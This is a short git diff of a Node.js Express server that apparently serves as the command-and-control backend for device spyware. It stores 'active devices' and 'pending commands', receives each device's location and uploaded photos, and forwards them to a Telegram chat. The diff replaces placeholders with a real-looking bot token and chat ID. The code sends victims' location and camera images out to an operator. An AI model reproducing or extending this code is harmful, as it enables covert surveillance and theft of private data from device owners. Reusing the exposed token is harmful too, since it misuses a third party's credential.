@@ -5,7 +5,7 @@ const { Telegraf } = require('telegraf');
 
 const app = express();
 const upload = multer({ dest: 'uploads/' });
-const bot = new Telegraf('YOUR_TELEGRAM_BOT_TOKEN');
+const bot = new Telegraf('8135547900:AAH0_VE0mjqOnfHCjQgsBy3BYpbX981phTE');
 
 let devices = {}; // Stores active devices
 let commands = {}; // Stores pending commands
@@ -27,13 +27,13 @@ app.get('/get_command', (req, res) => {
 // Receive location
 app.get('/send_location', (req, res) => {
     const { device_id, lat, lon } = req.query;
-    bot.telegram.sendMessage('YOUR_TELEGRAM_CHAT_ID', `📍 Location from ${device_id}: https://maps.google.com/?q=${lat},${lon}`);
+    bot.telegram.sendMessage('5742146376', `📍 Location from ${device_id}: https://maps.google.com/?q=${lat},${lon}`);
     res.send("Location sent");
 });
 
 // Receive photo
 app.post('/send_photo', upload.single('photo'), (req, res) => {
-    bot.telegram.sendPhoto('YOUR_TELEGRAM_CHAT_ID', { source: req.file.path });
+    bot.telegram.sendPhoto('5742146376', { source: req.file.path });
     res.send("Photo sent");
 });
 
